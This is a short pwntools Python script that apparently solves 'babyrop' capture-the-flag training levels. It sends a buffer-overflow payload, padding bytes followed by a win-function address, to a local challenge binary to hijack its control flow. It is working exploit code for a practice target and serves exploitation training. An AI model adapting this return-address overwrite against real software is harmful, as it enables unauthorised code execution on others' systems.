#!/usr/bin/python

from pwn import *


def baby1_0(p):
    win_addr = 0x00401fca

    #data = cyclic(200) Find crash index cyclic_find(0x6261616f6261616e) = 152
    data = b'A'*152 + p64(win_addr)

    p.recvuntil(b'address).')
    p.sendline(data)

def baby1_1(p):
    win_addr = 0x4017c7

    #data = cyclic(200) # Find crash index cyclic_find(0x6161616c6161616b) = 40
    data = b'A'*40 + p64(win_addr)

    p.recvuntil(b'###')
    p.sendline(data)


p = process('/challenge/babyrop_level1.1')
#p = process('./babyrop_level1.1')
#p = gdb.debug('./babyrop_level1.1','''
#c            
#''')


baby1_1(p)
p.interactive()